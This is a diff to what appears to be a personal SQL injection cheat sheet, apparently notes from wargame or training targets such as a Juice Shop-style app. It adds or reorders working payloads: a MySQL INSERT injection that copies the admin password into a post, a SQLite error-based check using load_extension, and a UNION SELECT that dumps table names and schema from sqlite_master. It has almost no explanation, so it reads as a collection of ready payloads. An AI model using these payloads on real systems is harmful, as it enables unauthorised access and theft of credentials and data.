@@ -25,9 +25,32 @@ admin' AND extractvalue(null, concat(0x23, ( SELECT substring(upw, 21, 100) from
 ## MySQL Insert query injection
 
 ~~~ sql
-query = "insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0);"
+insert into tmitter_board(idx, id, msg, etc) values (0, 'guest', 'hello', 0); -- example
 
-insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0);
+asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)# -- payload
 
-asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#
+insert into tmitter_board(idx, id, msg, etc) values (0, 'asdf1234', null), (0, 'admin', (select ps from tmitter_user where id='admin'), 0)#', 'hello', 0); -- result
+
+
 ~~~
+
+<br>
+
+## SQLite Error based injection
+
+~~~ sql
+AND CASE WHEN (SELECT 1 FROM Users WHERE email='jim@juice-sh.op') THEN 1 ELSE load_extension(1) END;
+~~~
+
+<br>
+
+## SQLite Extract table name, sql
+
+~~~ sql
+UNION SELECT name,sql,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table';
+~~~
+
+
+
+
+
